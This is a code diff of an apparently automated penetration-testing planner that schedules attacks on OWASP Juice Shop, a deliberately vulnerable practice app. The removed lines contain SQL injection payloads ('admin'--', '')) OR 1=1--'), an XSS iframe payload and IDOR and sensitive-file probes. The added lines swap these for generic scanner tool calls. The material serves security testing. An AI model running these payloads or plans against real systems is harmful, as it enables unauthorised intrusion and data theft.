@@ -349,112 +349,111 @@ PRIORITY: Use these known working attack vectors first for quick wins!
     ) -> PlanResult:
         """
         Generate optimized attack plan for OWASP Juice Shop
+        Uses only available tools from the registry.
         """
         tasks = []
-        attack_plan = get_attack_plan(target)
 
-        # Phase 1: Reconnaissance (always first)
+        # Clean target URL (remove hash fragments)
+        clean_target = target.split('#')[0].rstrip('/')
+
+        # Phase 1: Reconnaissance
         tasks.append(Task(
             id=str(uuid.uuid4()),
-            description="Check /main.js for hardcoded secrets",
-            tool_name="http_request",
-            parameters={"url": f"{target}/main.js", "method": "GET"},
+            description="Crawl Juice Shop to discover all endpoints",
+            tool_name="crawl",
+            parameters={"url": clean_target, "depth": 3, "max_pages": 50},
             priority=1
         ))
         tasks.append(Task(
             id=str(uuid.uuid4()),
-            description="Enumerate /ftp directory for sensitive files",
-            tool_name="directory_list",
-            parameters={"url": f"{target}/ftp"},
+            description="Detect technologies used by Juice Shop",
+            tool_name="tech_detect",
+            parameters={"url": clean_target},
             priority=2
         ))
 
-        # Phase 2: SQL Injection attacks (known working)
-        sqli_payloads = JUICE_SHOP_VULNS["sql_injection"]["payloads"]
+        # Phase 2: SQL Injection attacks (known working on Juice Shop)
         tasks.append(Task(
             id=str(uuid.uuid4()),
-            description="SQL injection on login - Admin bypass with admin'--",
+            description="SQL injection on login endpoint - admin bypass",
             tool_name="test_sqli",
             parameters={
-                "url": f"{target}/rest/user/login",
-                "method": "POST",
-                "payload": {"email": "admin'--", "password": "x"}
+                "url": f"{clean_target}/rest/user/login",
+                "parameter": "email"
             },
             priority=10
         ))
         tasks.append(Task(
             id=str(uuid.uuid4()),
-            description="SQL injection on search - ')) OR 1=1--",
+            description="SQL injection on product search",
             tool_name="test_sqli",
             parameters={
-                "url": f"{target}/rest/products/search",
-                "param": "q",
-                "payload": "')) OR 1=1--"
+                "url": f"{clean_target}/rest/products/search?q=test",
+                "parameter": "q"
             },
             priority=11
         ))
 
-        # Phase 3: XSS attacks (DOM-based)
+        # Phase 3: XSS attacks
         tasks.append(Task(
             id=str(uuid.uuid4()),
-            description="DOM XSS on search via iframe injection",
+            description="XSS on search functionality",
             tool_name="test_xss",
             parameters={
-                "url": f"{target}/#/search",
-                "param": "q",
-                "payload": "<iframe src=\"javascript:alert('xss')\">"
+                "url": f"{clean_target}/rest/products/search?q=test",
+                "parameter": "q"
             },
             priority=20
         ))
 
-        # Phase 4: Broken Access Control (IDOR)
+        # Phase 4: LFI / Path Traversal (for /ftp access)
         tasks.append(Task(
             id=str(uuid.uuid4()),
-            description="IDOR on baskets - access other users' baskets",
-            tool_name="test_idor",
+            description="Path traversal on file endpoints",
+            tool_name="test_lfi",
             parameters={
-                "url": f"{target}/rest/basket/{{id}}",
-                "id_range": [1, 10]
+                "url": f"{clean_target}/ftp",
+                "parameter": "file"
             },
             priority=30
         ))
-        tasks.append(Task(
-            id=str(uuid.uuid4()),
-            description="Access admin panel without authentication",
-            tool_name="http_request",
-            parameters={
-                "url": f"{target}/administration",
-                "method": "GET"
-            },
-            priority=31
-        ))
 
-        # Phase 5: Sensitive Data Exposure
+        # Phase 5: SSRF testing
         tasks.append(Task(
             id=str(uuid.uuid4()),
-            description="Download package.json.bak from FTP",
-            tool_name="http_request",
+            description="SSRF testing on URL parameters",
+            tool_name="test_ssrf",
             parameters={
-                "url": f"{target}/ftp/package.json.bak",
-                "method": "GET"
+                "url": f"{clean_target}/profile/image/url",
+                "parameter": "url"
             },
             priority=40
         ))
+
+        # Phase 6: Auth testing
         tasks.append(Task(
             id=str(uuid.uuid4()),
-            description="Check Prometheus metrics exposure",
-            tool_name="http_request",
+            description="Authentication bypass testing",
+            tool_name="test_auth",
             parameters={
-                "url": f"{target}/metrics",
-                "method": "GET"
+                "url": f"{clean_target}/rest/user/login"
             },
-            priority=41
+            priority=50
+        ))
+
+        # Phase 7: Chain analysis
+        tasks.append(Task(
+            id=str(uuid.uuid4()),
+            description="Analyze vulnerabilities for exploitation chains",
+            tool_name="chain_analysis",
+            parameters={},
+            priority=100
         ))
 
         return PlanResult(
             success=True,
             tasks=tasks,
-            reasoning=f"Juice Shop detected! Using specialized attack plan with {len(tasks)} optimized tasks targeting known vulnerabilities."
+            reasoning=f"Juice Shop detected! Using {len(tasks)} optimized tasks targeting known vulnerabilities (SQLi on login/search, XSS, LFI, SSRF)."
         )
 
     async def replan(
